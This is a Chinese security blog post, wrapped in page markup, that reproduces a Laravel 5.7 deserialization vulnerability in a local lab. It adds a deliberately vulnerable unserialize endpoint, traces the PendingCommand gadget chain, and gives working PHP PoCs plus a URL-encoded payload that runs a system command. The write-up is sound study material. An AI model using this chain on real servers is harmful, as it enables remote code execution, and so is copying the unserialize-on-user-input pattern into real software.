@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>laravel5.7反序列化漏洞复现 | Secfeng</title>
+  <meta name="keywords" content=" laravel ">
+  <meta name="description" content="laravel5.7反序列化漏洞复现 | Secfeng">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:site_name" content="Secfeng">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-05T11:53:12.000Z">
+<meta property="article:modified_time" content="2023-03-28T14:09:40.008Z">
+<meta property="article:author" content="Secfeng">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Secfeng</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/secfeng"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(16)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="16">
+<input type="hidden" id="yelog_site_word_count" value="38.2k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>buuctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>laravel</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>yii</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/23/ssrf(ctfshow)/"
+           data-tag="ssrf"
+           data-author="" >
+            <span class="post-title" title="ssrf(ctfshow)">ssrf(ctfshow)</span>
+            <span class="post-date" title="2023-08-23 09:32:37">2023/08/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/16/xss(ctfshow)/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss(ctfshow)">xss(ctfshow)</span>
+            <span class="post-date" title="2023-08-16 09:00:57">2023/08/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/03/buuctf/"
+           data-tag="buuctf"
+           data-author="" >
+            <span class="post-title" title="buuctf">buuctf</span>
+            <span class="post-date" title="2023-08-03 15:39:34">2023/08/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI模板注入">SSTI模板注入</span>
+            <span class="post-date" title="2023-07-25 16:51:43">2023/07/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI注入(ctfshow)">SSTI注入(ctfshow)</span>
+            <span class="post-date" title="2023-07-25 16:30:32">2023/07/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="laravel"
+           data-author="" >
+            <span class="post-title" title="laravel5.7反序列化漏洞复现">laravel5.7反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-30 16:31:25">2023/05/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="yii"
+           data-author="" >
+            <span class="post-title" title="yii2框架反序列化漏洞复现">yii2框架反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-29 16:22:42">2023/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化">php反序列化</span>
+            <span class="post-date" title="2023-05-27 20:16:39">2023/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化(ctfshow)">php反序列化(ctfshow)</span>
+            <span class="post-date" title="2023-05-09 20:42:55">2023/05/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(ctfshow)">文件包含(ctfshow)</span>
+            <span class="post-date" title="2023-04-25 10:39:55">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(upload-labs)">文件上传(upload-labs)</span>
+            <span class="post-date" title="2023-04-19 14:08:07">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"
+           data-tag="linux"
+           data-author="" >
+            <span class="post-title" title="linux学习">linux学习</span>
+            <span class="post-date" title="2023-04-14 22:24:49">2023/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(ctfshow)">命令执行(ctfshow)</span>
+            <span class="post-date" title="2023-04-09 19:52:07">2023/04/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php伪协议">php伪协议</span>
+            <span class="post-date" title="2023-04-04 22:21:18">2023/04/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php特性(ctfshow)">php特性(ctfshow)</span>
+            <span class="post-date" title="2023-04-03 15:56:51">2023/04/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xss/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss">xss</span>
+            <span class="post-date" title="2023-03-28 20:37:01">2023/03/28</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-laravel5.7反序列化漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">laravel5.7反序列化漏洞复现</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color3">laravel</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-07-13 11:17:14'>2023-05-30 16:31</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:1.7k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-text">简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9A"><span class="toc-text">环境部署：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">反序列化链分析：</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>和yii一样，Laravel也是一套简洁、优雅的PHPWeb开发框架（PHP Web Framework）。</p>
+<h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><p>下载源码：</p>
+<pre><code>https://github.com/laravel/laravel/tree/5.7
+</code></pre>
+<p>然后就是构造一个反序列化的利用点了，在routes&#x2F;web.php里面加一条路由：</p>
+<pre><code>Route::get(&#39;/unserialize&#39;,&quot;UnserializeController@uns&quot;);  //类名@方法名
+</code></pre>
+<p>在App\Http\Controllers下面写一个控制器UnserializeController.php文件：</p>
+<pre><code>&lt;?php
+namespace App\Http\Controllers;
+class UnserializeController extends Controller
+&#123;
+    public function uns()&#123;
+        if(isset($_GET[&#39;c&#39;]))&#123;
+            unserialize($_GET[&#39;c&#39;]);
+        &#125;else&#123;
+            highlight_file(__FILE__);
+        &#125;
+        return &quot;uns&quot;;
+    &#125;
+&#125;
+</code></pre>
+<h2 id="反序列化链分析："><a href="#反序列化链分析：" class="headerlink" title="反序列化链分析："></a>反序列化链分析：</h2><p>漏洞链的起点在vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php，与5.6相比，5.7多了一个<code>PendingCommand.php</code>文件。</p>
+<p>看一下这个新增的类，发现有一个<code>__destruct()</code></p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/170946.png" class="">
+
+<p><code>$this-&gt;hasExecuted</code>默认是false的，所以可以直接进入run方法：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/171403.png" class="">
+
+<p>要想执行到异常处理代码<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>中得先经过 $this-&gt;mockConsoleOutput()：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/173138.png" class="">
+
+<p>一堆看不懂的代码，来个poc试试：</p>
+<pre><code>&lt;?php
+namespace Illuminate\Foundation\Testing&#123;
+    class PendingCommand
+    &#123;
+        protected $command;
+        protected $parameters;
+        public function __construct()&#123;
+            $this-&gt;command=&quot;system&quot;;
+            $this-&gt;parameters[]=&quot;dir&quot;;
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    use Illuminate\Foundation\Testing\PendingCommand;
+    echo urlencode(serialize(new PendingCommand()));
+&#125;
+</code></pre>
+<p>生成payload，然后传值过去：</p>
+<pre><code>http://127.0.0.1/laravel-5.7/public/index.php/unserialize?c=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7D
+</code></pre>
+<p>报错了：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/204918.png" class="">
+
+<p>打一下断点，发现是mockConsoleOutput()方法中的createABufferedOutputMock()函数：</p>
+<pre><code>foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123;
+</code></pre>
+<p>报错的原因就是因为<code>$this-&gt;test</code>没有expectedOutput这个属性。跟进一下这个属性，发现这个属性在<code>trait InteractsWithConsole</code>中，trait类我们没法实例化，此外就只有一些测试类有这个属性，因此这里就卡住了。这时候想到利用__get方法</p>
+<p>大师傅们经过寻找，选择了Illuminate\Auth\GenericUser类：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/155543.png" class="">
+
+<p>在这里对类的加载有个疑问，后来在一篇文章中找到了：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/100933.png" class="">
+
+<p><code>attributes</code>是可控的，因此直接构造即可。<br>而且，会发现<code>mockConsoleOutput()</code>方法中也有类似的代码：</p>
+<pre><code>foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123;
+</code></pre>
+<p>因此构造：</p>
+<pre><code>&lt;?php
+namespace Illuminate\Foundation\Testing&#123;
+    use Illuminate\Auth\GenericUser;
+    class PendingCommand
+    &#123;
+        protected $command;
+        protected $parameters;
+        public $test;
+        public function __construct()&#123;
+            $this-&gt;command=&quot;system&quot;;
+            $this-&gt;parameters[]=&quot;dir&quot;;
+            $this-&gt;test=new GenericUser();
+        &#125;
+    &#125;
+&#125;
+namespace Illuminate\Auth&#123;
+    class GenericUser
+    &#123;
+        protected $attributes;
+        public function __construct()&#123;
+            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];
+            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    use Illuminate\Foundation\Testing\PendingCommand;
+    echo urlencode(serialize(new PendingCommand()));
+&#125;
+</code></pre>
+<p>还是报错：</p>
+<pre><code>“Call to a member function bind() on null”
+</code></pre>
+<p>意思是在null上调用成员函数bind()</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/084006.png" class="">
+
+<p>原因应该是没有构造$this-&gt;app，看一下app:</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/084501.png" class="">
+
+<p>继续构造：</p>
+<pre><code>&lt;?php
+namespace Illuminate\Foundation\Testing&#123;
+    use Illuminate\Auth\GenericUser;
+    use Illuminate\Foundation\Application;
+    class PendingCommand
+    &#123;
+        protected $command;
+        protected $parameters;
+        public $test;
+        protected $app;
+        public function __construct()&#123;
+            $this-&gt;command=&quot;system&quot;;
+            $this-&gt;parameters[]=&quot;dir&quot;;
+            $this-&gt;test=new GenericUser();
+            $this-&gt;app=new Application();
+        &#125;
+    &#125;
+&#125;
+namespace Illuminate\Foundation&#123;
+    class Application&#123;
+    &#125;
+&#125;
+namespace Illuminate\Auth&#123;
+    class GenericUser
+    &#123;
+        protected $attributes;
+        public function __construct()&#123;
+            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];
+            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    use Illuminate\Foundation\Testing\PendingCommand;
+    echo urlencode(serialize(new PendingCommand()));
+&#125;
+</code></pre>
+<p>继续报错：</p>
+<pre><code>Target [Illuminate\Contracts\Console\Kernel] is not instantiable
+</code></pre>
+<p>此时就到了这条链上最困难的点：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/101803.png" class="">
+
+<p><code>Kernel::class</code>是完全限定名称，返回的是一个类的完整的带上命名空间的类名，在laravel这里是<code>Illuminate\Contracts\Console\Kernel</code>。</p>
+<p>打断点跟进：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/102333.png" class="">
+
+<p>跟进到父类的make()：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/102557.png" class="">
+
+<p>跟进到resolve()：</p>
+<pre><code>protected function resolve($abstract, $parameters = [])
+    &#123;
+        $abstract = $this-&gt;getAlias($abstract);
+        $needsContextualBuild = ! empty($parameters) || ! is_null(
+            $this-&gt;getContextualConcrete($abstract)
+        );
+        if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;
+            return $this-&gt;instances[$abstract];
+        &#125;
+        $this-&gt;with[] = $parameters;
+        $concrete = $this-&gt;getConcrete($abstract);
+        if ($this-&gt;isBuildable($concrete, $abstract)) &#123;
+            $object = $this-&gt;build($concrete);
+        &#125; else &#123;
+            $object = $this-&gt;make($concrete);
+        &#125;
+        foreach ($this-&gt;getExtenders($abstract) as $extender) &#123;
+            $object = $extender($object, $this);
+        &#125;
+        if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;
+            $this-&gt;instances[$abstract] = $object;
+        &#125;
+        $this-&gt;fireResolvingCallbacks($abstract, $object);
+        $this-&gt;resolved[$abstract] = true;
+        array_pop($this-&gt;with);
+        return $object;
+    &#125;
+</code></pre>
+<p>可以看到最终会返回一个object，我们是要调用这个object的call方法来执行命令，全局查找一下，这个执行命令的call方法到底在哪个类：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/103803.png" class="">
+
+<p>发现在container类里，而构造的app的类是Application类，这个类正好也是container类的子类，所以最终返回这个Application的实例就可以了。</p>
+<p>再来看一下resolve()方法的代码：</p>
+<p>$concrete &#x3D; $this-&gt;getConcrete($abstract);</p>
+<pre><code>    protected function getConcrete($abstract)
+    &#123;
+        if (! is_null($concrete = $this-&gt;getContextualConcrete($abstract))) &#123;
+            return $concrete;
+        &#125;
+        // If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just
+        // assume each type is a concrete name and will attempt to resolve it as is
+        // since the container should be able to resolve concretes automatically.
+        if (isset($this-&gt;bindings[$abstract])) &#123;
+            return $this-&gt;bindings[$abstract][&#39;concrete&#39;];
+        &#125;
+        return $abstract;
+    &#125;
+</code></pre>
+<p>第一个if成立不了，主要看第二个if，因为bindings是container的属性，而这里的$this其实就是我们传的app，app的类正好是container的子类，所以bindings的属性同样可控，因此getConcrete()函数的返回值是我们可控的。</p>
+<p><code>getConcrete()</code>函数之后是这个：</p>
+<pre><code>    if ($this-&gt;isBuildable($concrete, $abstract)) &#123;
+        $object = $this-&gt;build($concrete);
+    &#125; else &#123;
+        $object = $this-&gt;make($concrete);
+    &#125;
+
+protected function isBuildable($concrete, $abstract)
+&#123;
+    return $concrete === $abstract || $concrete instanceof Closure;
+&#125;
+</code></pre>
+<p>这里的$concrete是我们可控的，而$abstract是Illuminate\Contracts\Console\Kernel。经过打断点测试，$this-&gt;build($concrete)得到的结果基本就是最终这个get the value of offset返回的了，因此要想办法让$concrete是Illuminate\Foundation\Application，先来看一下大佬们的poc:</p>
+<pre><code>&lt;?php
+namespace Illuminate\Foundation\Testing&#123;
+    use Illuminate\Auth\GenericUser;
+    use Illuminate\Foundation\Application;
+    class PendingCommand
+    &#123;
+        protected $command;
+        protected $parameters;
+        public $test;
+        protected $app;
+        public function __construct()&#123;
+            $this-&gt;command=&quot;system&quot;;
+            $this-&gt;parameters[]=&quot;dir&quot;;
+            $this-&gt;test=new GenericUser();
+            $this-&gt;app=new Application();
+        &#125;
+    &#125;
+&#125;
+namespace Illuminate\Foundation&#123;
+    class Application&#123;
+        protected $bindings = [];
+        public function __construct()&#123;
+            $this-&gt;bindings=array(
+                &#39;Illuminate\Contracts\Console\Kernel&#39;=&gt;array(
+                    &#39;concrete&#39;=&gt;&#39;Illuminate\Foundation\Application&#39;
+                )
+            );
+        &#125;
+    &#125;
+&#125;
+namespace Illuminate\Auth&#123;
+    class GenericUser
+    &#123;
+        protected $attributes;
+        public function __construct()&#123;
+            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];
+            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    use Illuminate\Foundation\Testing\PendingCommand;
+    echo urlencode(serialize(new PendingCommand()));
+&#125;
+</code></pre>
+<p>这样到了</p>
+<pre><code>    if ($this-&gt;isBuildable($concrete, $abstract)) &#123;
+        $object = $this-&gt;build($concrete);
+    &#125; else &#123;
+        $object = $this-&gt;make($concrete);
+    &#125;
+</code></pre>
+<p>的时候，$concrete是Illuminate\Foundation\Application，$abstract是Illuminate\Contracts\Console\Kernel，无法isBuildable，还会再进入一次make，不过这次make中的$concrete就是我们构造的了。进入make，然后再进入resolve，再进入getConcrete()方法:</p>
+<pre><code>    if (isset($this-&gt;bindings[$abstract])) &#123;
+       return $this-&gt;bindings[$abstract][&#39;concrete&#39;];
+    &#125;
+    return $abstract;
+</code></pre>
+<p>不存在$this-&gt;bindings[‘Illuminate\Foundation\Application’]，所以会直接return Illuminate\Foundation\Application，这样$abstract也是Illuminate\Foundation\Application了,最终<code>$this-&gt;app[Kernel::class]</code>返回的就是实例化的<code>Illuminate\Foundation\Application</code>类了。然后开始调用call方法,最终成功执行命令：</p>
+<img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/111438.png" class="">
+
+<p>参考链接:<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113826483">https://blog.csdn.net/rfrder/article/details/113826483</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023-2026 Secfeng
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
